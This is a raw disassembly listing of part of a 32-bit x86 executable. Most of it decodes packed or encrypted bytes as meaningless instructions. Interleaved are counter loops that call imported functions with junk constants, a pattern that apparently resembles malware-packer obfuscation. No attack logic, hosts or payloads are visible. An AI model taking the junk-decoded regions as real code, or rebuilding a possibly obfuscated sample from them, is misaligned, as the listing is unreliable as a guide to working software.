  40a1f9:	rcr    BYTE PTR [edx-0x29],cl
  40a1fc:	fild   WORD PTR [ebx]
  40a1fe:	xor    DWORD PTR [edi+eax*2],0xffffffb8
  40a202:	inc    al
  40a204:	xchg   ecx,eax
  40a205:	or     al,0x9a
  40a207:	lahf   
  40a208:	(bad)  
  40a209:	addr16 jo 0x40a1cb
  40a20c:	mov    bl,0x5b
  40a20e:	shl    BYTE PTR [esi+0x72],cl
  40a211:	pop    ebp
  40a212:	mov    ds:0x1d73993c,al
  40a217:	or     DWORD PTR [edx+0x2a09d7b5],ebp
  40a21d:	jmp    0x40a283
  40a21f:	mov    al,0x69
  40a221:	mov    dl,0x52
  40a223:	xchg   edi,eax
  40a224:	ss neg edi
  40a227:	test   al,0xf3
  40a229:	mov    bh,0x4f
  40a22b:	mov    ebx,0x45c7527c
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x312da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	inc    edx
  40a2c5:	cdq    
  40a2c6:	or     eax,0x70f545ae
  40a2cb:	jo     0x40a26c
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a265
  40a2d1:	cld    
  40a2d2:	mov    edi,DWORD PTR [ecx]
  40a2d4:	mov    BYTE PTR [ebx+0x61],cl
  40a2d7:	pop    ebp
  40a2d8:	call   0xf1714dc2
  40a2dd:	loope  0x40a358
  40a2df:	and    eax,0x80a2ff30
  40a2e4:	push   ebp
  40a2e5:	iret   
  40a2e6:	sti    
  40a2e7:	jmp    0x8bf6:0x8790fd7c
  40a2ee:	out    dx,eax
  40a2ef:	add    eax,0xda345d96
  40a2f4:	mov    bl,0x8d
  40a2f6:	fiadd  DWORD PTR [esi-0x4ebb8152]
  40a2fc:	jo     0x40a355
  40a2fe:	outs   dx,BYTE PTR ds:[esi]
  40a2ff:	std    
  40a300:	xchg   BYTE PTR [esi+0xa],al
  40a303:	test   eax,0xddfff9b3
  40a308:	pop    eax
  40a309:	popa   
  40a30a:	stos   DWORD PTR es:[edi],eax
  40a30b:	or     ebx,DWORD PTR [ebp-0x498c3673]
  40a311:	or     BYTE PTR [ebx+0x26473ec8],cl
  40a317:	xor    al,0x4f
  40a319:	stos   DWORD PTR es:[edi],eax
  40a31a:	or     DWORD PTR [ecx+edi*8],ebx
  40a31d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a31e:	ss aam 0xb7
  40a321:	pop    edx
  40a322:	into   
  40a323:	retf   
  40a324:	mov    dh,BYTE PTR [ecx+0x4c966fd1]
  40a32a:	xor    BYTE PTR [eax+0x5e],bl
  40a32d:	in     al,dx
  40a32e:	xor    BYTE PTR [ebp-0x7f948379],bh
  40a334:	iret   
  40a335:	bsr    esp,DWORD PTR [ebx+0x30]
  40a339:	call   0x98cc8e1e
  40a33e:	or     esi,ecx
  40a340:	inc    esp
  40a341:	stos   BYTE PTR es:[edi],al
  40a342:	aad    0xa5
  40a344:	or     esi,DWORD PTR [esi+0x65b0129f]
  40a34a:	loope  0x40a3b7
  40a34c:	pop    ecx
  40a34d:	hlt    
  40a34e:	pop    edx
  40a34f:	popf   
  40a350:	jb     0x40a325
  40a352:	rcl    ch,1
  40a354:	or     eax,0x5fe8102b
  40a359:	rep lods al,BYTE PTR ds:[esi]
  40a35b:	push   0xffffffa6
  40a35d:	lods   al,BYTE PTR ds:[esi]
  40a35e:	(bad)  
  40a35f:	rol    esp,1
  40a361:	push   esi
  40a362:	std    
  40a363:	xchg   ebx,eax
  40a364:	fs sbb al,0xb3
  40a367:	xchg   BYTE PTR [ebx],bl
  40a369:	popa   
  40a36a:	pusha  
  40a36b:	sub    al,0x5
  40a36d:	in     al,dx
  40a36e:	inc    eax
  40a36f:	xchg   ecx,eax
  40a370:	dec    edi
  40a371:	stc    
  40a372:	mul    bl
  40a374:	in     eax,0x4d
  40a376:	push   ds
  40a377:	sbb    dl,BYTE PTR [edx-0x43]
  40a37a:	mov    ah,0x34
  40a37c:	fmul   QWORD PTR ds:0x859ed77c
  40a382:	add    dh,cl
  40a384:	dec    eax
  40a385:	xchg   ebp,eax
  40a386:	aaa    
  40a387:	mov    ecx,eax
  40a389:	adc    BYTE PTR [ecx+0x6871db4d],0x4a
  40a390:	mov    ecx,0xb061760d
  40a395:	add    ebx,DWORD PTR [ebx-0x31]
  40a398:	jno    0x40a3c3
  40a39a:	add    al,0xc2
  40a39c:	punpcklwd mm7,mm1
  40a39f:	sbb    eax,DWORD PTR [ecx+0x71f399]
  40a3a5:	call   0x8e8a2798
  40a3aa:	data16 in al,dx
  40a3ac:	xchg   ebp,eax
  40a3ad:	jno    0x40a38e
  40a3af:	fdivr  QWORD PTR [edi+0x2d]
  40a3b2:	mov    bl,0xa9
  40a3b4:	(bad)  
  40a3b6:	jmp    0x40a429
  40a3b8:	ret    
  40a3b9:	adc    al,0x55
  40a3bb:	call   0x89d7dbb3
  40a3c0:	adc    DWORD PTR [edx],ecx
  40a3c2:	mov    esp,0x9e45bc21
  40a3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3c8:	jmp    0x40a3bb
  40a3ca:	fld    QWORD PTR [esi+0x62e1a160]
  40a3d0:	jmp    0x5638557c
  40a3d5:	sbb    DWORD PTR [ebp-0x7f24805],esi
  40a3db:	sahf   
  40a3dc:	sbb    ah,dh
  40a3de:	fdiv   DWORD PTR [ebx+ebp*4]
  40a3e1:	cwde   
  40a3e2:	sbb    BYTE PTR [ebx],dl
  40a3e4:	sar    bl,1
  40a3e6:	jmp    0xb3a43910
  40a3eb:	mov    bh,0x33
  40a3ed:	js     0x40a468
  40a3ef:	bound  ebx,QWORD PTR [ebp+ebp*8+0x41d2c036]
  40a3f6:	leave  
  40a3f7:	test   BYTE PTR [ebx+0x63],ch
  40a3fa:	and    DWORD PTR [edi],edx
  40a3fc:	jmp    0x8aed:0xccf4b6d2
  40a403:	xchg   ebx,eax
  40a404:	xchg   esp,eax
  40a405:	ret    0xe42b
  40a408:	les    ebx,FWORD PTR [ecx]
  40a40a:	sub    DWORD PTR [eax+0x54],edi
  40a40d:	xchg   edi,eax
  40a40e:	(bad)  
  40a40f:	mov    BYTE PTR [ebx-0x5f],bl
  40a412:	call   0x69a:0xf1f7eed
  40a419:	call   0x847f22ce
  40a41e:	sbb    eax,DWORD PTR [edx-0x39d5097f]
  40a424:	and    al,0xa9
  40a426:	test   esi,esi
  40a428:	(bad)  
  40a429:	jne    0x40a44b
  40a42b:	stos   DWORD PTR es:[edi],eax
  40a42c:	jge    0x40a42f
  40a42e:	xor    esp,ebx
  40a430:	popa   
  40a431:	add    eax,0x8ec720bb
  40a436:	lea    edi,ds:[edx]
  40a439:	stc    
  40a43a:	(bad)  
  40a43b:	iret   
  40a43c:	and    eax,0x8acb16b5
  40a441:	xor    eax,0xa2f1e844
  40a446:	push   eax
  40a447:	adc    dl,BYTE PTR [ebx]
  40a449:	push   edi
  40a44a:	or     esi,DWORD PTR [esp+edi*1+0x66]
  40a44e:	jge    0x40a3d7
  40a450:	shl    BYTE PTR [ebx-0x21d0d88e],cl
  40a456:	rcl    DWORD PTR [ebp-0x6e],1
  40a459:	inc    ecx
  40a45a:	push   esi
  40a45b:	jmp    0x40a450
  40a45d:	push   edx
  40a45e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a45f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a460:	ret    0x5465
  40a463:	or     BYTE PTR [edx-0x7aa2463b],0xff
  40a46a:	fild   WORD PTR [edx+0x2ddb0cfa]
  40a470:	push   edi
  40a471:	pusha  
  40a472:	and    al,0x41
  40a474:	or     esp,DWORD PTR [edx]
  40a476:	jg     0x40a41c
  40a478:	pop    ecx
  40a479:	xchg   ebx,eax
  40a47a:	les    ecx,FWORD PTR [ecx]
  40a47c:	mov    ah,0xc2
  40a47e:	lahf   
  40a47f:	frstor [esi-0xce25357]
  40a485:	lock add DWORD PTR [edx+edi*2-0x27c6ea46],edx
  40a48d:	jnp    0x40a4d1
  40a48f:	pusha  
  40a490:	mov    bh,0x20
  40a492:	sbb    al,0xd9
  40a494:	mov    edx,0xfd3b66d1
  40a499:	lods   eax,DWORD PTR ds:[esi]
  40a49a:	mov    ecx,DWORD PTR [ecx-0x180719c]
  40a4a0:	in     al,0x3d
  40a4a2:	out    0xe,al
  40a4a4:	add    eax,0x4f5f3760
  40a4a9:	jb     0x40a44d
  40a4ab:	jno    0x40a504
  40a4ad:	sub    bh,bh
  40a4af:	shr    BYTE PTR [edi-0x4420fff9],0x1d
  40a4b6:	enter  0xa04f,0x5b
  40a4ba:	ins    BYTE PTR es:[edi],dx
  40a4bb:	dec    ebp
  40a4bc:	add    esp,edx
  40a4be:	fdivr  st(7),st
  40a4c0:	and    DWORD PTR [ecx-0x344ac119],ecx
  40a4c6:	or     cl,BYTE PTR [edx-0x2cb2d2db]
  40a4cc:	and    BYTE PTR [eax-0x69],0x4b
  40a4d0:	ror    DWORD PTR [edx],0xd9
  40a4d3:	add    al,0x27
  40a4d5:	sbb    DWORD PTR [esi+0x45a3cd9],ebp
  40a4db:	(bad)  
  40a4dc:	lods   al,BYTE PTR ds:[esi]
  40a4dd:	xor    ebp,ebx
  40a4df:	mov    edi,0x4ea94d82
  40a4e4:	fs jp  0x40a4c9
  40a4e7:	hlt    
  40a4e8:	xchg   BYTE PTR [edi],al
  40a4ea:	sbb    edi,DWORD PTR [eax]
  40a4ec:	pop    ecx
  40a4ed:	xchg   BYTE PTR [edi+0x1c],ah
  40a4f0:	retf   
  40a4f1:	data16 in al,0x7a
  40a4f4:	sub    eax,0x8795690a
  40a4f9:	inc    esp
  40a4fa:	mov    ch,ch
  40a4fc:	mov    al,0x96
  40a4fe:	mul    dh
  40a500:	or     eax,DWORD PTR [ebx]
  40a502:	repz push es
  40a504:	jno    0x40a530
  40a506:	ja     0x40a565
  40a508:	jb     0x40a4a3
  40a50a:	mov    cr6,esi
  40a50d:	repz and BYTE PTR [ecx+0x5fdbdd86],al
  40a514:	xor    eax,0x2cb0d793
  40a519:	cmp    BYTE PTR [ebp+0x1d38330e],ch
  40a51f:	push   edx
  40a520:	mov    esi,0x218d6a98
  40a525:	sbb    BYTE PTR [edi+edi*1],dl
  40a528:	and    BYTE PTR [ecx-0x47],ch
  40a52b:	xchg   edi,eax
  40a52c:	arpl   bx,dx
  40a52e:	in     al,dx
  40a52f:	inc    edi
  40a530:	fidivr DWORD PTR [esi-0x43]
  40a533:	jnp    0x40a57b
  40a535:	int    0xfa
  40a537:	sbb    bh,ch
  40a539:	cs or  al,0xc4
  40a53c:	mov    DWORD PTR [esp+edx*1-0x4c],0xdb2e297
  40a544:	jo     0x40a530
  40a546:	mov    cl,0xb8
  40a548:	je     0x40a59c
  40a54a:	cdq    
  40a54b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a54c:	cdq    
  40a54d:	aad    0x59
  40a54f:	jp     0x40a4d5
  40a551:	mov    bh,0x52
  40a553:	lahf   
  40a554:	arpl   WORD PTR [esi+ecx*2],sp
  40a557:	aaa    
  40a558:	sub    al,0x42
  40a55a:	ins    DWORD PTR es:[edi],dx
  40a55b:	aas    
  40a55c:	icebp  
  40a55d:	push   0x7d697224
  40a562:	les    ecx,FWORD PTR [eax+eax*8-0x63321510]
  40a569:	pop    ecx
  40a56a:	cmp    BYTE PTR [edx],ah
  40a56c:	pop    esp
  40a56d:	add    edx,ecx
  40a56f:	lds    esp,FWORD PTR [eax]
  40a571:	push   ds
  40a572:	dec    edx
  40a573:	mov    ds:0x14c7d8b9,al
  40a578:	mul    DWORD PTR [edi-0x19]
  40a57b:	xchg   edx,eax
  40a57c:	bound  eax,QWORD PTR [esi]
  40a57e:	and    eax,0x14db370c
  40a583:	arpl   WORD PTR [ebx+edx*4],cx
  40a586:	popa   
  40a587:	pop    ebp
  40a588:	jge    0x40a5b5
  40a58a:	arpl   WORD PTR [eax+0x68],di
  40a58d:	js     0x40a511
  40a58f:	enter  0x64cf,0xa5
  40a593:	lods   al,BYTE PTR ds:[esi]
  40a594:	jbe    0x40a59f
  40a596:	int3   
  40a597:	add    bh,ch
  40a599:	bnd je 0x40a567
  40a59c:	je     0x40a5b0
  40a59e:	adc    eax,0xecb1e3ca
  40a5a3:	sub    BYTE PTR [edx+0x6fb59cae],al
  40a5a9:	lea    ecx,[ecx]
  40a5ab:	shl    DWORD PTR [ecx],1
  40a5ad:	mov    ah,0xea
  40a5af:	mov    al,ds:0x9dd2d35f
  40a5b4:	popa   
  40a5b5:	enter  0x68eb,0x1f
  40a5b9:	gs mov bl,0xe6
  40a5bc:	xchg   BYTE PTR [esi+0x46],bl
  40a5bf:	repnz nop
  40a5c1:	les    eax,FWORD PTR [ebx]
  40a5c3:	push   edi
  40a5c4:	rcr    ebp,cl
  40a5c6:	xchg   ebx,eax
  40a5c7:	loopne 0x40a600
  40a5c9:	repnz push ebp
  40a5cb:	push   edi
  40a5cc:	mov    bl,0xa6
  40a5ce:	aas    
  40a5cf:	btr    DWORD PTR [eax-0x4cce832a],ebp
  40a5d6:	cmp    dh,BYTE PTR [edi+0x5c]
  40a5d9:	xchg   esi,eax
  40a5da:	jg     0x40a623
  40a5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5dd:	dec    ebp
  40a5de:	ins    DWORD PTR es:[edi],dx
  40a5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e0:	push   0x55
  40a5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e3:	mov    eax,0x7d801a4c
  40a5e8:	ss scas al,BYTE PTR es:[edi]
  40a5ea:	push   es
  40a5eb:	jbe    0x40a5f7
  40a5ed:	adc    dl,BYTE PTR [esi+esi*1-0x2d0587f1]
  40a5f4:	div    DWORD PTR [ebx-0x5c]
  40a5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5f8:	lds    esi,FWORD PTR [ecx-0x1e]
  40a5fb:	mov    eax,0x24702fa1
  40a600:	and    DWORD PTR ds:0x385fa52,esi
  40a606:	outs   dx,DWORD PTR ds:[esi]
  40a607:	and    esi,eax
  40a609:	add    dh,BYTE PTR [esi+0x21]
  40a60c:	test   eax,0xd57b0d10
  40a611:	add    cl,BYTE PTR [ebx-0x3]
  40a614:	xor    ecx,ebp
  40a616:	adc    ah,BYTE PTR ds:0x2fcb5267
  40a61c:	out    0x53,al
  40a61e:	cmp    bh,cl
  40a620:	aas    
  40a621:	inc    BYTE PTR [edi+0x42]
  40a624:	jns    0x40a643
  40a626:	pop    es
  40a627:	adc    eax,0xb1126927
  40a62c:	xlat   BYTE PTR ds:[ebx]
  40a62d:	xchg   ebx,eax
  40a62e:	sub    esi,DWORD PTR es:[ebx-0x5a912a3a]
  40a635:	icebp  
  40a636:	dec    ebx
  40a637:	frstor [ebp-0x6]
  40a63a:	cli    
  40a63b:	ficom  DWORD PTR [esp]
  40a63e:	cmp    cl,BYTE PTR [esi-0x52]
  40a641:	sub    DWORD PTR [ebx],esp
  40a643:	sub    esi,DWORD PTR [ebx]
  40a645:	mov    dl,0x59
  40a647:	(bad)  
  40a648:	or     ebp,DWORD PTR [ebx-0x5f737314]
  40a64e:	mov    fs,WORD PTR [eax-0x80ca3e5]
  40a654:	jp     0x40a659
  40a656:	xor    ebp,DWORD PTR [ebp+edx*1+0x468fb5e5]
  40a65d:	or     eax,0x6b7efa9a
  40a662:	add    bh,dh
  40a664:	imul   ebx,DWORD PTR [edx-0x78757b36],0x50
  40a66b:	ret    
  40a66c:	retf   
  40a66d:	sbb    bh,BYTE PTR [eax+0x31]
  40a670:	sbb    al,0xc7
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	push   ebp
  40a854:	nop
  40a855:	adc    al,dl
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a892
  40a860:	push   es
  40a861:	lods   al,BYTE PTR ds:[esi]
  40a862:	xor    DWORD PTR [ebx+0x50],ebx
  40a865:	ds (bad) 
  40a867:	in     al,0x5a
  40a869:	sub    al,0x4
  40a86b:	call   0x91fc:0xf87258e7
  40a872:	pusha  
  40a873:	sbb    al,0x5f
  40a875:	repnz imul edi,DWORD PTR [eax-0x5b],0x381b8bd9
  40a87d:	mov    ebx,0x54b4c2a6
  40a882:	(bad)  
  40a883:	xor    DWORD PTR [ebp+0x6b],eax
  40a886:	daa    
  40a887:	sub    eax,edx
  40a889:	(bad)  
  40a88a:	in     al,dx
  40a88b:	push   eax
  40a88c:	sbb    bl,BYTE PTR [edx-0x7c]
  40a88f:	pop    es
  40a890:	dec    ebp
  40a891:	enter  0xcbef,0x86
  40a895:	push   eax
  40a896:	shl    BYTE PTR [eax+0x9d24573],cl
  40a89c:	lods   eax,DWORD PTR ds:[esi]
  40a89d:	xchg   edi,eax
  40a89e:	ja     0x40a912
  40a8a0:	pop    ss
  40a8a1:	jae    0x40a89c
  40a8a3:	mov    esp,0x52e36ca1
  40a8a8:	loopne 0x40a842
  40a8aa:	(bad)  
  40a8ab:	sub    esp,DWORD PTR [ecx]
  40a8ad:	je     0x40a8b4
  40a8af:	and    bh,BYTE PTR [esp+ebx*1-0x6faca897]
  40a8b6:	fwait
  40a8b7:	add    eax,0x8d20fd37
  40a8bc:	lock pop ebp
  40a8be:	retf   0x425a
  40a8c1:	jns    0x40a89c
  40a8c3:	jne    0x40a889
  40a8c5:	outs   dx,BYTE PTR ds:[esi]
  40a8c6:	loop   0x40a854
  40a8c8:	shr    BYTE PTR [ebx+0x27e2ec0d],1
  40a8ce:	ins    BYTE PTR es:[edi],dx
  40a8cf:	dec    edx
  40a8d0:	or     al,BYTE PTR [esi-0x9170f16]
  40a8d6:	(bad)  
  40a8d7:	sti    
  40a8d8:	jle    0x40a8be
  40a8da:	jae    0x40a8c9
  40a8dc:	inc    BYTE PTR [edi-0x5f]
  40a8df:	aas    
  40a8e0:	test   al,0xec
  40a8e2:	mov    edi,0x2d39234f
  40a8e7:	inc    ebx
  40a8e8:	cmp    BYTE PTR [eax+0x6f],0x5f
  40a8ec:	xor    bh,BYTE PTR ds:0x7e1a06ef
  40a8f2:	dec    edi
  40a8f3:	jg     0x40a914
  40a8f5:	test   DWORD PTR [edi],esi
  40a8f7:	fiadd  DWORD PTR [esi-0x46]
  40a8fa:	jl     0x40a900
  40a8fc:	and    BYTE PTR [edx+esi*8-0x54f8a4a3],0x64
  40a904:	sahf   
  40a905:	sub    eax,0xc2d4b996
  40a90a:	retf   
  40a90b:	mov    dl,0xa6
  40a90d:	jge    0x40a8e1
  40a90f:	xor    edi,DWORD PTR [eax]
  40a911:	ror    DWORD PTR [edi],0x41
  40a914:	in     eax,dx
  40a915:	mov    ecx,0x94302415
  40a91a:	dec    esp
  40a91b:	call   0x1f450fae
  40a920:	shl    DWORD PTR [eax-0x171f3a05],cl
  40a926:	adc    BYTE PTR [ecx-0x51e13afc],cl
  40a92c:	or     eax,0x7d4dc361
  40a931:	jbe    0x40a924
  40a933:	dec    esi
  40a934:	icebp  
  40a935:	nop
  40a936:	lock mul BYTE PTR [edx-0x1a]
  40a93a:	in     al,dx
  40a93b:	jns    0x40a9b8
  40a93d:	dec    ecx
  40a93e:	sub    BYTE PTR [edi-0x777ee2b3],dh
  40a944:	mov    al,ds:0x7c0f2a97
  40a949:	sub    DWORD PTR [edi+0x15],esi
  40a94c:	xlat   BYTE PTR ds:[ebx]
  40a94d:	sub    eax,0xca8a109b
  40a952:	adc    eax,0x1cc82370
  40a957:	inc    eax
  40a958:	sbb    BYTE PTR [esi-0x55afb3ab],0x49
  40a95f:	jne    0x40a97d
  40a961:	popa   
  40a962:	stos   DWORD PTR es:[edi],eax
  40a963:	pusha  
  40a964:	lods   al,BYTE PTR ds:[esi]
  40a965:	fld    DWORD PTR [edi-0x65]
  40a968:	jg     0x40a931
  40a96a:	ss pop esp
  40a96c:	mov    ch,0x4a
  40a96e:	mov    ecx,0x2d93e3d5
  40a973:	lods   eax,DWORD PTR ds:[esi]
  40a974:	mov    cl,0x19
  40a976:	sahf   
  40a977:	xlat   BYTE PTR ds:[ebx]
  40a978:	int    0xda
  40a97a:	cmc    
  40a97b:	ins    DWORD PTR es:[edi],dx
  40a97c:	fdivr  DWORD PTR [eax+eax*1+0x26]
  40a980:	outs   dx,DWORD PTR ds:[esi]
  40a981:	(bad)
  40a985:	push   ds
  40a986:	pop    esi
  40a987:	jl     0x40a929
  40a989:	sbb    al,0x38
  40a98b:	mov    ecx,esi
  40a98d:	inc    ebx
  40a98e:	push   ds
  40a98f:	sahf   
  40a990:	dec    esp
  40a991:	mov    esp,0x3951fd79
  40a996:	or     BYTE PTR [ecx],0xda
  40a999:	mov    eax,0xe9ddddbf
  40a99e:	push   esp
  40a99f:	fs dec eax
  40a9a1:	out    dx,al
  40a9a2:	and    ebp,DWORD PTR [edi+0x7c]
  40a9a5:	mov    eax,DWORD PTR [ebp+edi*8+0x238ed710]
  40a9ac:	mov    bl,bh
  40a9ae:	repz xchg ebp,eax
  40a9b0:	mov    bl,0x70
  40a9b2:	inc    esi
  40a9b3:	cmp    al,0x2a
  40a9b5:	adc    al,0x61
  40a9b7:	jnp    0x40a963
  40a9b9:	inc    ebx
  40a9ba:	xchg   ebx,eax
  40a9bb:	sub    DWORD PTR [edi],0xffffff84
  40a9be:	(bad)  
  40a9bf:	stc    
  40a9c0:	push   ebp
  40a9c1:	add    dh,ah
  40a9c3:	ins    BYTE PTR es:[edi],dx
  40a9c4:	cmp    al,0xf4
  40a9c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9c7:	mov    bl,ch
  40a9c9:	xor    ah,BYTE PTR [eax+eiz*4+0x48]
  40a9cd:	jp     0x40a9b8
  40a9cf:	ins    BYTE PTR es:[edi],dx
  40a9d0:	ud2    
  40a9d2:	jbe    0x40a9fa
  40a9d4:	loop   0x40a9fd
  40a9d6:	mul    BYTE PTR ds:0x28db8d9d
  40a9dc:	test   al,0x8f
  40a9de:	mov    cl,0x87
  40a9e0:	adc    BYTE PTR [ecx+0x38efacd4],ah
  40a9e6:	dec    ebp
  40a9e7:	dec    edi
  40a9e8:	das    
  40a9e9:	jge    0x40aa06
  40a9eb:	mov    ebp,0xd9e24b7a
  40a9f0:	mov    ah,0x1
  40a9f2:	jecxz  0x40aa12
  40a9f4:	jmp    0xd70ddebd
  40a9f9:	lahf   
  40a9fa:	and    esi,eax
  40a9fc:	sub    al,0xc0
  40a9fe:	enter  0xe378,0x16
  40aa02:	push   0xbbb60610
  40aa07:	and    eax,0x420de6a8
  40aa0c:	mov    bh,0x54
  40aa0e:	xchg   edi,eax
  40aa0f:	clc    
  40aa10:	mov    bh,0xbc
  40aa12:	pop    edi
  40aa13:	inc    ecx
  40aa14:	in     al,dx
  40aa15:	fild   DWORD PTR [edi+0x16]
  40aa18:	fwait
  40aa19:	mov    ch,0x1a
  40aa1c:	rcr    DWORD PTR [ecx+0x7caf1475],cl
  40aa22:	push   ebx
  40aa23:	adc    al,0xd0
  40aa25:	add    eax,0x9004d8d7
  40aa2a:	div    BYTE PTR [ebx]
  40aa2c:	retf   0x5d99
  40aa2f:	mov    al,0x6b
  40aa31:	push   ecx
  40aa32:	test   al,0x87
  40aa34:	das    
  40aa35:	ret    0xb61f
  40aa38:	mov    ds:0x7b892819,al
  40aa3d:	xor    eax,DWORD PTR [ebx-0x78]
  40aa40:	and    al,0x1e
  40aa42:	mov    BYTE PTR [ebx*2-0x269a4ce8],ch
  40aa49:	and    ecx,edx
  40aa4b:	adc    DWORD PTR [ebx+0x4af139bf],esi
  40aa51:	mov    edx,0x1a741ac0
  40aa56:	in     al,0xb5
